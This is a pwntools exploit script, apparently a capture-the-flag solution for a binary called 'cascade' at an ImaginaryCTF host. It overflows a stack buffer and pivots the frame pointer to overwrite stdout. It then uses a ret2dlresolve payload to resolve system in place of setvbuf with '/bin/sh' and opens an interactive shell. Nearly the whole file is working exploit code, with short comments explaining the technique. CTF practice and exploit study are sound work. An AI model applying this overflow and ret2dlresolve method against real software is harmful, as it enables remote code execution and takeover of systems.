#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './vuln_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc cascade.chal.imaginaryctf.org 1337'.split()

if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    libc = ELF('libc.so.6')
    ld = ELF('./ld-linux-x86-64.so.2')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def extract_leak(recv):
    '''Extract the leaked address from the received data.'''
    try:
        leak = list(map(lambda x: int(x,16), recv.split(b'|')[1:]))
        return leak
    except (IndexError, ValueError):
        log.error("Failed to extract leak from: {}".format(recv))
        return None
    

def addrx(func, x):
    '''Show func in hex'''
    log.info(f'{func}: {x}')


gdbscript = '''
b *(0x0000000000401162+0)
continue
'''.format(**locals())

p = start()
pop_rbp_ret = 0x0040113d
vuln_load = 0x0000000000401162

'''
vuln_load is -> lea rax,[rbp-0x40]
if we set rbp to stdout + 0x40 we can overwrite stdout.
because we dont have pop rdi gadget, we can overwrite-
stdout to pointer to /bin/sh string and setvbuf to system
'''

payload = flat(
    b'a' * 72,
    pop_rbp_ret,
    exe.sym.stdout+0x40,
    vuln_load,
    # exe.sym._start,
)

p.send(payload)

rop = ROP(exe)
dlresolve = Ret2dlresolvePayload(exe, symbol='system', args=[],data_addr=0x000000404070, resolution_addr=exe.got.setvbuf)

'''
system() expects char* as its argument.
so we redirect stdout to stdout + 8 where we put /bin/sh string.
'''
payload2 = flat(
    exe.sym.stdout + 8,
    b"/bin/sh".ljust(8, b'\0'),
    b'a'* 40,
    pop_rbp_ret,
    0x404f00 + 0x40,
    vuln_load,
    dlresolve.payload,
).ljust(0x200)


p.send(payload2)
rop.ret2dlresolve(dlresolve)
rop.raw(rop.ret)
rop.main()
log.info(rop.dump())

payload3 = flat(
    b"a" * 72,
    rop.chain(),
)
p.send(payload3)

p.interactive()